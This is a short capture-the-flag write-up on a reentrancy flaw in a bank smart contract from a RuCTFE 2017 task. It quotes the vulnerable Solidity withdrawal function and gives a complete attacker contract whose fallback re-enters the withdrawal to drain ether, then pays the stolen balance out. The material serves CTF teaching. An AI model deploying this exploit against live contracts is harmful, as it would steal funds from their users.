# Exploiting bank smart-contract

Bank smart-contract is based on the **PirateCoin** task on [RuCTFE 2017][ructfe].
We'll be exploiting vulnerable bank smart-contract running on Ethereum.
You can find a full source code of the bank here `contracts/Bank.sol`.
Let's look at the most interesting part

```
function withdrawBalance() public {
  var amountToWithdraw = userBalances[msg.sender];
  if (amountToWithdraw == 0) return;

  require(msg.sender.call.value(amountToWithdraw)());
  totalBankBalance -= userBalances[msg.sender];
  userBalances[msg.sender] = 0;
}
```

The main problem here is that a call to transfer ether is made **before** balance
updated. This call is blocking, so we can expect user's default fallback function
`function () payable` to be called. Inside we can recursively call `withdrawBalance()`
and receive ether **twice**. Here is an example of smart-contract that exploit this
vulerability

```
pragma solidity ^0.4.15;

import "./Bank.sol";

contract Pwn {
  Bank public bank;
  bool public performAttack = false;

  function setBank(address _bank) public {
    bank = Bank(_bank);
  }

  function steal() public payable {
    bank.addToBalance.value(msg.value)();
    performAttack = true;
    bank.withdrawBalance();
  }

  function getJackpot() public {
    msg.sender.transfer(this.balance);
  }

  function () public payable {
    if (performAttack) {
      performAttack = false;
      bank.withdrawBalance();
    }
  }
}
```

[ructfe]: https://ructfe.org/index
